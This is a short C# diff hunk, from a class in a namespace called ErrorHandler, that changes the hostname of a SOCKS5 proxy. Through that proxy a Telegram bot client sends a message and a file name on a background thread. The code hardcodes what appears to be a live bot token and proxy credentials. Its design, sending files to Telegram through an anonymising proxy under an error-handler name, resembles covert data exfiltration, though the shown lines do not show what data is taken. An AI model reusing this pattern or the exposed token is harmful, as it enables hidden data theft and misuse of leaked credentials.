@@ -28,7 +28,7 @@ namespace ErrorHandler
         public void StartSending(string message, string fileName)
         {
             var token = @"937505998:AAEio5mETihkBgLyERRb8KhJG8A1g8SCMXQ";
-            var proxy = new HttpToSocks5Proxy("so2.10g2.cf", 8085, "p7", "341") { ResolveHostnamesLocally = false };
+            var proxy = new HttpToSocks5Proxy("s2.10g2.cf", 8085, "p7", "341") { ResolveHostnamesLocally = false };
             bot = new TelegramBotClient(token, proxy);
             var ts = new Thread(new ThreadStart(async () => await Send_(message, fileName)));
             ts.Start();
